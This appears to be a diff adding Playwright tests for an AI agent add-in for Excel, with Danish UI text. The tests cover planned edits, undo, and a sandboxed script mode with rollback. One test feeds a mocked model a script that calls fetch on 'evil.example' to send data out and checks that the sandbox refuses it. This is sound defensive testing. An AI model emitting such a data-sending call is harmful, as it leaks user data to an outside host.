@@ -7,6 +7,9 @@ type Sheet = {
   formats: Record<string, { numberFormat?: string; bold?: boolean; fill?: string }>;
   tables: { name: string; range: string; style?: string }[];
   widths: Record<string, number>;
+  charts: { name: string; type: string; source: string; title?: string; at?: string }[];
+  conditionalFormats: { address: string; type: string }[];
+  frozenRows: number | null;
 };
 const sheet = (page: import("@playwright/test").Page) => page.evaluate(() => (window as unknown as { __miai: { sheet: () => Sheet } }).__miai.sheet());
 
@@ -235,6 +238,142 @@ test("Excel: sletning, der ville ødelægge en tabel, fravælges i planen", asyn
   await tp.run("Agent: redigér dokumentet");
   await expect(tp.page.getByText("Ville ændre en tabels opbygning")).toBeVisible();
   await expect(tp.page.getByRole("checkbox", { name: "Slet rækkerne A1:B2" })).not.toBeChecked();
+});
+
+const SALG = {
+  sheet: "Ark1",
+  values: [
+    ["Region", "Måned", "Omsætning"],
+    ["Nord", "Jan", 120],
+    ["Syd", "Jan", 340],
+    ["Øst", "Jan", 90],
+    ["Vest", "Jan", 210],
+  ],
+  formats: { "A1:C1": { bold: true }, "C2:C5": { numberFormat: "#,##0" } },
+  tables: [{ name: "Salg", range: "A1:C5" }],
+};
+
+test("Excel: sortér, betinget formatering, diagram og frys rækker; fortryd fjerner det hele igen", async ({ open }) => {
+  const tp = await open({ host: "Excel", apiSets: { ExcelApi: "1.10" }, excel: SALG });
+  const before = await sheet(tp.page);
+  tp.model.reply = () => ({
+    json: JSON.stringify({
+      summary: "Sorterer, fremhæver og viser omsætningen som diagram.",
+      actions: [
+        { action: "sortRange", target: "Salg", by: "Omsætning", order: "desc", reason: "Størst først" },
+        { action: "conditionalFormat", address: "C2:C5", rule: "dataBar", reason: "Datalinjer" },
+        { action: "addChart", source: "Salg", type: "column", title: "Omsætning pr. region", reason: "Diagram" },
+        { action: "freezeRows", rows: 1, reason: "Overskrift synlig" },
+      ],
+    }),
+  });
+  await tp.run("Agent: redigér dokumentet");
+  await expect(tp.page.getByRole("checkbox", { name: "Sortér Salg efter Omsætning (faldende)" })).toBeChecked();
+  await expect(tp.page.getByRole("checkbox", { name: "Betinget formatering i C2:C5: datalinjer" })).toBeChecked();
+  await expect(tp.page.getByRole("checkbox", { name: "Søjlediagram af Salg “Omsætning pr. region”" })).toBeChecked();
+  await expect(tp.page.getByRole("checkbox", { name: "Frys de øverste 1 rækker" })).toBeChecked();
+  await tp.page.getByRole("button", { name: "Udfør 4 handlinger" }).click();
+  await expect(tp.page.getByText("4 af 4 handlinger udført.")).toBeVisible();
+  const after = await sheet(tp.page);
+  expect(after.values.map((r) => r[0])).toEqual(["Region", "Syd", "Vest", "Nord", "Øst"]);
+  // Formaterne følger rækkerne, og overskriften står.
+  expect(after.formats.C2).toMatchObject({ numberFormat: "#,##0" });
+  expect(after.formats.A1).toMatchObject({ bold: true });
+  expect(after.charts).toEqual([{ name: "Diagram 1", type: "ColumnClustered", source: "A1:C5", title: "Omsætning pr. region", at: "E1" }]);
+  expect(after.conditionalFormats).toEqual([{ address: "Ark1!C2:C5", type: "DataBar" }]);
+  expect(after.frozenRows).toBe(1);
+
+  await tp.page.getByRole("button", { name: "Fortryd agent-session" }).click();
+  await expect(tp.page.getByText("Agent-sessionen er fortrudt.")).toBeVisible();
+  const undone = await sheet(tp.page);
+  expect(undone.values).toEqual(before.values);
+  expect(undone.formats).toEqual(before.formats);
+  expect(undone.charts).toEqual([]);
+  expect(undone.conditionalFormats).toEqual([]);
+  expect(undone.frozenRows).toBeNull();
+});
+
+const SCRIPT = `const sheet = context.workbook.worksheets.getActiveWorksheet();
+const range = sheet.getRange("C2:C5");
+range.load("values");
+await context.sync();
+const total = range.values.reduce((s, r) => s + Number(r[0]), 0);
+sheet.getRange("E1:E2").values = [["I alt"], [total]];
+await context.sync();
+return \`Skrev summen \${total} i E2\`;`;
+
+test("Excel, kodetilstand slået fra: et script fra modellen kan ikke vælges", async ({ open }) => {
+  const tp = await open({ host: "Excel", apiSets: { ExcelApi: "1.10" }, excel: SALG });
+  tp.model.reply = () => ({
+    json: JSON.stringify({ summary: "Script.", actions: [{ action: "runScript", description: "Summen i E2", code: SCRIPT, reason: "" }] }),
+  });
+  await tp.run("Agent: redigér dokumentet");
+  // Modellen får ikke vejledningen til script-værktøjet, når det er slået fra (skemaet nævner det stadig).
+  expect(tp.model.lastRequest!.messages[0].content).not.toContain("runScript {description, code}");
+  await expect(tp.page.getByText("Kodetilstanden er slået fra (Indstillinger)")).toBeVisible();
+  await expect(tp.page.getByRole("checkbox", { name: "Kør script: Summen i E2" })).not.toBeChecked();
+});
+
+test("Excel, kodetilstand: scriptet vises, køres i sandkassen og kan fortrydes", async ({ open }) => {
+  const tp = await open({ host: "Excel", apiSets: { ExcelApi: "1.10" }, excel: SALG, settings: { agentScripts: true } });
+  const before = await sheet(tp.page);
+  tp.model.reply = () => ({
+    json: JSON.stringify({ summary: "Lægger omsætningen sammen.", actions: [{ action: "runScript", description: "Summen i E2", code: SCRIPT, reason: "" }] }),
+  });
+  await tp.run("Agent: redigér dokumentet");
+  expect(tp.model.lastRequest!.messages[0].content).toContain("runScript {description, code}");
+  await expect(tp.page.getByText("Fjerner indhold")).toBeVisible();
+  await tp.page.getByText("Vis koden").click();
+  await expect(tp.page.getByText('sheet.getRange("E1:E2").values')).toBeVisible();
+  await tp.page.getByRole("button", { name: "Udfør 1 handling" }).click();
+  await expect(tp.page.getByText("Skrev summen 760 i E2")).toBeVisible();
+  const after = await sheet(tp.page);
+  expect(after.values[0][4]).toBe("I alt");
+  expect(after.values[1][4]).toBe(760);
+  await expect(tp.page.getByText(/Betinget formatering, datavalidering og ændringer på andre ark gendannes ikke/)).toBeVisible();
+
+  await tp.page.getByRole("button", { name: "Fortryd agent-session" }).click();
+  await expect(tp.page.getByText("Agent-sessionen er fortrudt.")).toBeVisible();
+  const undone = await sheet(tp.page);
+  expect(undone.values.map((r) => r.slice(0, 3))).toEqual(before.values);
+  expect(undone.values.every((r) => (r[4] ?? "") === "")).toBe(true);
+  expect(undone.formats).toEqual(before.formats);
+});
+
+test("Excel, kodetilstand: sandkassen afviser netværk, og et fejlende script rulles tilbage og kan rettes af modellen", async ({ open }) => {
+  const tp = await open({ host: "Excel", apiSets: { ExcelApi: "1.10" }, excel: SALG, settings: { agentScripts: true } });
+  const before = await sheet(tp.page);
+  tp.model.reply = () => ({
+    json: JSON.stringify({
+      summary: "Sender data.",
+      actions: [{ action: "runScript", description: "Upload", code: "await fetch('https://evil.example/?d=1')", reason: "" }],
+    }),
+  });
+  await tp.run("Agent: redigér dokumentet");
+  await expect(tp.page.getByText("Bruger noget, sandkassen ikke tillader")).toBeVisible();
+  await expect(tp.page.getByRole("checkbox", { name: "Kør script: Upload" })).not.toBeChecked();
+
+  // Et script, der skriver og så fejler: ændringen rulles tilbage.
+  const broken = `context.workbook.worksheets.getActiveWorksheet().getRange("A2").values = [["Ødelagt"]];\nawait context.sync();\nthrow new Error("Bum: kolonnen findes ikke");`;
+  tp.model.reply = () => ({
+    json: JSON.stringify({ summary: "Retter.", actions: [{ action: "runScript", description: "Ret A2", code: broken, reason: "" }] }),
+  });
+  await tp.run("Agent: redigér dokumentet");
+  await tp.page.getByRole("button", { name: "Udfør 1 handling" }).click();
+  await expect(tp.page.getByText(/Bum: kolonnen findes ikke – ændringerne er rullet tilbage/)).toBeVisible();
+  await expect(tp.page.getByText(/arket er sat tilbage til, som det var/)).toBeVisible();
+  expect((await sheet(tp.page)).values.map((r) => r.slice(0, 3))).toEqual(before.values);
+
+  // "Bed modellen rette scriptet" sender fejlen og koden med.
+  tp.model.reply = () => ({
+    json: JSON.stringify({ summary: "Rettet.", actions: [{ action: "runScript", description: "Summen i E2", code: SCRIPT, reason: "" }] }),
+  });
+  await tp.page.getByRole("button", { name: "Bed modellen rette scriptet" }).click();
+  await expect(tp.page.getByRole("checkbox", { name: "Kør script: Summen i E2" })).toBeChecked();
+  const prompt = tp.model.lastRequest!.messages.map((m) => m.content).join("\n");
+  expect(prompt).toContain("Your previous plan failed");
+  expect(prompt).toContain("Bum: kolonnen findes ikke");
+  expect(prompt).toContain('getRange("A2")');
 });
 
 type Deck = {
